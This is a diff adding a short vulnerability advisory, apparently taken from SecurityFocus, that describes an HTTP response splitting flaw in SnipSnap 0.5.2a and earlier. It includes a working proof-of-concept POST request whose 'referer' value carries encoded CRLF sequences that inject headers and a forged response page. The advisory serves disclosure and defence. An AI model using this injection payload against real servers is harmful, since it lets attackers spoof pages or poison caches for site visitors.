@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/11180/info
+
+SnipSnap is reported prone to an HTTP response splitting vulnerability. The issue exists in the 'referer' parameter. The issue presents itself due to a flaw in the application that allows an attacker to manipulate how POST requests are handled.
+
+This issue was identified in SnipSnap 0.5.2a and prior.
+
+The following proof of concept example is available: 
+POST /exec/authenticate HTTP/1.0
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-length: 197
+
+referer=abc%0d%0aConnection:%20keep-alive%0d%0aContent-Length:%200%0d%0a%0d%
+0aHTTP/1.0%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:20%0d%
+0a%0d%0a<html>0wned!!</html>&cancel=cancel
